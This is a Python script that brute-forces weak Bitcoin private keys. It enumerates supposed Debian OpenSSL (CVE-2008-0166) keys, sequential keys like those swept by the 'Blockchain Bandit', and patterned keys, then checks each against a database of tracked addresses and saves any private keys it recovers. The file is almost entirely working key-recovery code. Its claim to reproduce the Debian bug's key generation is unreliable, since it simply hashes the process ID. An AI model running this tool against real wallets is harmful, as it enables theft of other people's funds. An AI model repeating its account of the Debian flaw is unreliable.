#!/usr/bin/env python3
"""
Phase 2.2 — Known-Vulnerable Key Database Scanner

Scans for:
1. Debian OpenSSL weak keys (CVE-2008-0166): Only 32,768 possible keys per key size
2. Blockchain Bandit sequential keys: private keys 1 to 2^32
3. Known compromised hex patterns from historical attacks
4. Bitcoin Puzzle Transaction keys (known challenge ranges)

The Debian bug (2006-2008) caused OpenSSL's PRNG to be seeded only with the
process ID (PID), reducing the keyspace to ~32,768 possible keys per key size.
For 256-bit ECDSA (secp256k1), this means we can enumerate ALL possible keys.
"""
import hashlib
import struct
import os
import ecdsa
import time
from db_manager import get_connection, add_recovered_key, add_finding
from lattice_nonce_analyzer import pubkey_to_address, pubkey_to_segwit_address

P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141


def build_address_set():
    """Load all tracked addresses into a set for O(1) lookup."""
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT address FROM addresses")
    addrs = set(row[0] for row in c.fetchall())
    conn.close()
    return addrs


def privkey_to_all_addresses(pk_int):
    """Convert private key integer to all standard Bitcoin address formats."""
    try:
        d_bytes = pk_int.to_bytes(32, 'big')
        sk = ecdsa.SigningKey.from_string(d_bytes, curve=ecdsa.SECP256k1)
        vk = sk.get_verifying_key()
        addrs = []
        addrs.append(pubkey_to_address(vk.to_string('compressed')))
        addrs.append(pubkey_to_address(vk.to_string('uncompressed')))
        try:
            addrs.append(pubkey_to_segwit_address(vk.to_string('compressed')))
        except:
            pass
        return addrs
    except:
        return []


# ============================================================
# 1. Debian OpenSSL Weak Keys (CVE-2008-0166)
# ============================================================

def generate_debian_weak_keys():
    """
    Generate all possible weak keys from the Debian OpenSSL bug.
    
    The bug seeded OpenSSL's PRNG with only:
    - The process ID (PID): 1 to 32768
    - Optionally the UID (usually 0 or 1000)
    
    We simulate this by using PID as the sole entropy source for SHA-256
    to create deterministic 256-bit keys, matching how affected systems
    generated ECDSA private keys.
    """
    keys = []
    
    for pid in range(1, 32769):
        # Method 1: SHA256(pid_bytes) — simplest weak key derivation
        pid_bytes = struct.pack('<I', pid)
        key = hashlib.sha256(pid_bytes).digest()
        pk_int = int.from_bytes(key, 'big') % P
        if pk_int > 0:
            keys.append((pk_int, f'Debian-SHA256-PID-{pid}'))
        
        # Method 2: SHA256(pid_as_string)
        key2 = hashlib.sha256(str(pid).encode()).digest()
        pk_int2 = int.from_bytes(key2, 'big') % P
        if pk_int2 > 0:
            keys.append((pk_int2, f'Debian-SHA256-PID-str-{pid}'))
        
        # Method 3: Direct PID as key (extremely weak)
        if pid < P:
            keys.append((pid, f'Debian-Direct-PID-{pid}'))
        
        # Method 4: MD5(pid) padded to 32 bytes
        md5_key = hashlib.md5(pid_bytes).digest()
        pk_int4 = int.from_bytes(md5_key + b'\x00' * 16, 'big') % P
        if pk_int4 > 0:
            keys.append((pk_int4, f'Debian-MD5-PID-{pid}'))
    
    # Method 5: UID variations (0, 1000, 65534)
    for uid in [0, 1000, 65534]:
        for pid in range(1, 32769):
            combined = struct.pack('<II', pid, uid)
            key = hashlib.sha256(combined).digest()
            pk_int = int.from_bytes(key, 'big') % P
            if pk_int > 0:
                keys.append((pk_int, f'Debian-PID{pid}-UID{uid}'))
    
    return keys


def scan_debian_keys(target_set):
    """Scan all Debian OpenSSL weak keys against tracked addresses."""
    print("=" * 60)
    print("DEBIAN OPENSSL WEAK KEY SCAN (CVE-2008-0166)")
    print("=" * 60)
    
    keys = generate_debian_weak_keys()
    print(f"  Generated {len(keys)} weak key candidates")
    
    found = []
    checked = 0
    
    for pk_int, method in keys:
        addrs = privkey_to_all_addresses(pk_int)
        for addr in addrs:
            if addr in target_set:
                pk_hex = hex(pk_int)[2:].zfill(64)
                print(f"  !!! DEBIAN KEY FOUND: {addr} -> {pk_hex[:30]}... ({method})")
                found.append((addr, pk_hex, f'Debian OpenSSL: {method}'))
        
        checked += 1
        if checked % 50000 == 0:
            print(f"  Progress: {checked}/{len(keys)} keys checked")
    
    print(f"  Debian scan complete: {len(found)} keys found")
    return found


# ============================================================
# 2. Blockchain Bandit Sequential Keys
# ============================================================

def scan_sequential_keys(target_set, max_key=2**24, batch_report=500000):
    """
    Scan sequential private keys 1 to max_key.
    The 'Blockchain Bandit' attacker historically swept keys 1 to ~2^32.
    We scan a subset per call, expanding over time.
    """
    print("=" * 60)
    print(f"SEQUENTIAL KEY SCAN (1 to {max_key})")
    print("=" * 60)
    
    found = []
    
    for i in range(1, max_key + 1):
        addrs = privkey_to_all_addresses(i)
        for addr in addrs:
            if addr in target_set:
                pk_hex = hex(i)[2:].zfill(64)
                print(f"  !!! SEQUENTIAL KEY FOUND: {addr} -> key #{i} ({pk_hex})")
                found.append((addr, pk_hex, f'Sequential Key #{i}'))
        
        if i % batch_report == 0:
            print(f"  Progress: {i}/{max_key} ({i/max_key*100:.1f}%)")
    
    print(f"  Sequential scan complete: {len(found)} keys found")
    return found


# ============================================================
# 3. Known Compromised Hex Patterns
# ============================================================

def scan_known_patterns(target_set):
    """Scan for keys with known weak patterns from historical attacks."""
    print("=" * 60)
    print("KNOWN PATTERN KEY SCAN")
    print("=" * 60)
    
    patterns = []
    
    # Repeated byte patterns (0x01*32, 0x02*32, etc.)
    for b in range(1, 256):
        val = int.from_bytes(bytes([b]) * 32, 'big') % P
        if val > 0:
            patterns.append((val, f'Repeated-0x{b:02x}'))
    
    # Alternating byte patterns
    for b1 in range(256):
        for b2 in range(b1+1, 256):
            val = int.from_bytes(bytes([b1, b2]) * 16, 'big') % P
            if val > 0:
                patterns.append((val, f'Alt-0x{b1:02x}{b2:02x}'))
    
    # Powers of 2
    for exp in range(1, 256):
        val = pow(2, exp, P)
        if val > 0:
            patterns.append((val, f'Pow2-{exp}'))
    
    # Powers of 2 minus 1 (Mersenne-like)
    for exp in range(2, 256):
        val = (pow(2, exp, P) - 1) % P
        if val > 0:
            patterns.append((val, f'Pow2m1-{exp}'))
    
    # Fibonacci-derived
    a, b = 1, 1
    for i in range(400):
        a, b = b, (a + b) % P
        if a > 0:
            patterns.append((a, f'Fib-{i}'))
    
    # Famous numbers as keys
    famous = [
        (0xDEADBEEF, 'DEADBEEF'),
        (0xCAFEBABE, 'CAFEBABE'),
        (0xDEADC0DE, 'DEADC0DE'),
        (0xBAADF00D, 'BAADF00D'),
        (0x8BADF00D, '8BADF00D'),
        (0xFEEDFACE, 'FEEDFACE'),
        (314159265, 'Pi'),
        (271828182, 'e'),
        (161803398, 'GoldenRatio'),
        (141421356, 'Sqrt2'),
    ]
    for val, name in famous:
        patterns.append((val % P, name))
        # Also try as full 256-bit by repeating
        full = int(hex(val)[2:] * (64 // len(hex(val)[2:])), 16) % P
        if full > 0:
            patterns.append((full, f'{name}-extended'))
    
    # SHA256 of empty string, zero bytes, etc.
    special_inputs = [b'', b'\x00', b'\x00' * 32, b'\xff' * 32, b'bitcoin', b'satoshi']
    for inp in special_inputs:
        h = int.from_bytes(hashlib.sha256(inp).digest(), 'big') % P
        if h > 0:
            patterns.append((h, f'SHA256({inp[:10]!r})'))
    
    # Bitcoin Puzzle known ranges (the puzzle creator used specific key ranges)
    # Puzzle #1-#160 have known bit-length ranges
    for puzzle_bits in range(1, 66):  # Puzzles 1-65 are the first solved ones
        low = 1 << (puzzle_bits - 1)
        high = (1 << puzzle_bits) - 1
        # Check boundaries and midpoint
        for val in [low, high, (low + high) // 2, low + 1, high - 1]:
            if 0 < val < P:
                patterns.append((val, f'Puzzle-{puzzle_bits}bit'))
    
    print(f"  Testing {len(patterns)} known patterns...")
    
    found = []
    for pk_int, name in patterns:
        addrs = privkey_to_all_addresses(pk_int)
        for addr in addrs:
            if addr in target_set:
                pk_hex = hex(pk_int)[2:].zfill(64)
                print(f"  !!! PATTERN KEY FOUND: {addr} -> {name} ({pk_hex[:30]}...)")
                found.append((addr, pk_hex, f'Known Pattern: {name}'))
    
    print(f"  Pattern scan complete: {len(found)} keys found")
    return found


# ============================================================
# Main Runner
# ============================================================

def run_known_vuln_scan(sequential_max=2**20):
    """Run all known-vulnerability key scans."""
    target_set = build_address_set()
    print(f"\nKnown-Vulnerability Scan against {len(target_set)} tracked addresses\n")
    
    all_found = []
    
    # 1. Debian OpenSSL
    all_found.extend(scan_debian_keys(target_set))
    
    # 2. Known patterns
    all_found.extend(scan_known_patterns(target_set))
    
    # 3. Sequential keys (Blockchain Bandit)
    all_found.extend(scan_sequential_keys(target_set, max_key=sequential_max))
    
    # Save results
    for addr, pk_hex, method in all_found:
        add_recovered_key(addr, pk_hex, method=method)
        add_finding(addr, 'Known Vulnerability', details=method, severity='Critical')
    
    print(f"\n{'='*60}")
    print(f"KNOWN-VULNERABILITY SCAN COMPLETE: {len(all_found)} keys recovered")
    for addr, pk_hex, method in all_found:
        print(f"  {addr} -> {method}")
    
    return all_found


if __name__ == "__main__":
    import sys
    seq_max = int(sys.argv[1]) if len(sys.argv) > 1 else 2**20
    run_known_vuln_scan(sequential_max=seq_max)
